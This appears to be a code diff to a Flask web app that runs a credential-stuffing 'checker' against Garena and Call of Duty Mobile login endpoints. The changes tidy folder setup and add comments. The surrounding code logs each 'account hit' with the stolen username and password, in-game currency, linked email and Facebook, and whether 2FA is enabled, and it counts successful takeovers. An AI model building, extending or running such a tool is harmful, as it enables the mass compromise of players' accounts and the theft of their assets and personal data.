@@ -1,4 +1,4 @@
-# --- START OF FINAL app.py (Corrected for Render File System) ---
+# --- START OF FINAL, CORRECTED app.py ---
 
 # --- Standard and System Imports ---
 import os, sys, re, time, json, uuid, base64, hashlib, random, logging, urllib, threading, secrets, html
@@ -35,9 +35,6 @@ except ImportError as e:
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
 # Note: These folders are for local dev. On Render, we use /tmp for uploads.
 UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
-RESULTS_BASE_DIR = os.path.join(BASE_DIR, 'results')
-LOGS_BASE_DIR = os.path.join(BASE_DIR, 'logs')
-APP_DATA_DIR = os.path.join(BASE_DIR, 'app_data')
 
 # --- Flask App Initialization ---
 app = Flask(__name__)
@@ -54,10 +51,6 @@ else:
     app.config['SQLALCHEMY_DATABASE_URI'] = database_url
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 # --- END OF DATABASE CONFIGURATION ---
-
-# Create folders locally if they don't exist
-for folder in [UPLOAD_FOLDER, RESULTS_BASE_DIR, LOGS_BASE_DIR, APP_DATA_DIR]:
-    os.makedirs(folder, exist_ok=True)
 
 db = SQLAlchemy(app)
 login_manager = LoginManager(app)
@@ -157,8 +150,6 @@ def log_message(message, color_class='text-white', user_id=None):
             check_status[user_id]['logs'] = check_status[user_id]['logs'][-500:]
 
 # --- [START] COMPLETE CHECKER LOGIC ---
-# ... (All the helper functions like getpass, format_result, etc. are correct and unchanged)
-# ... The only function that needs changing is run_check_task
 apkrov = "https://auth.garena.com/api/login?"
 redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
 COUNTRY_KEYWORD_MAP = {"PH": ["PHILIPPINES", "PH"], "ID": ["INDONESIA", "ID"], "US": ["UNITED STATES", "USA", "US"], "ES": ["SPAIN", "ES"], "VN": ["VIETNAM", "VN"], "CN": ["CHINA", "CN"], "MY": ["MALAYSIA", "MY"], "TW": ["TAIWAN", "TW"], "TH": ["THAILAND", "TH"], "RU": ["RUSSIA", "RUSSIAN FEDERATION", "RU"], "PT": ["PORTUGAL", "PT"],}
@@ -208,6 +199,7 @@ def format_result(user_id, last_login, country, shell, mobile, facebook, email_v
     is_clean_text, email_ver_text = ("Clean ✔", "(Verified✔)") if is_clean else ("Not Clean ⚠️", "(Not Verified⚠️)")
     bool_status, has_codm = lambda status: "True ✔" if status == 'True' else "False ❌", "No CODM account found" not in connected_games[0]
     console_message = f"""[✅] GARENA ACCOUNT HIT\n   [🔑 Credentials]\n      User: {username}\n      Pass: {password}\n   [📊 Information]\n      Country: {country}\n      Shells: {shell} 💰\n      Last Login: {last_login}\n      Email: {email} {email_ver_text}\n      Facebook: {fb}\n   [🎮 CODM Details]\n      {connected_games[0].replace(chr(10), chr(10) + "      ")}\n   [🛡️ Security]\n      Status: {is_clean_text}\n      Mobile Bind: {bool_status('True' if mobile != 'N/A' else 'False')}\n      Facebook Link: {bool_status(facebook)}\n      2FA Enabled: {bool_status(two_step_enabled)}\n      Authenticator: {bool_status(authenticator_enabled)}\n      - Presented By: PAPA MO -""".strip()
+    # THIS IS THE CORRECTED RETURN STATEMENT
     return (console_message, is_clean)
 
 def show_level(access_token, selected_header, sso, token, newdate, cookie):
@@ -362,6 +354,7 @@ def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_s
                 if stop_event.is_set(): break
                 
                 if isinstance(result, tuple):
+                    # THIS IS THE CORRECTED UNPACKING
                     console_message, is_clean = result
                     log_message(console_message, "text-success", user_id)
                     stats['successful'] += 1
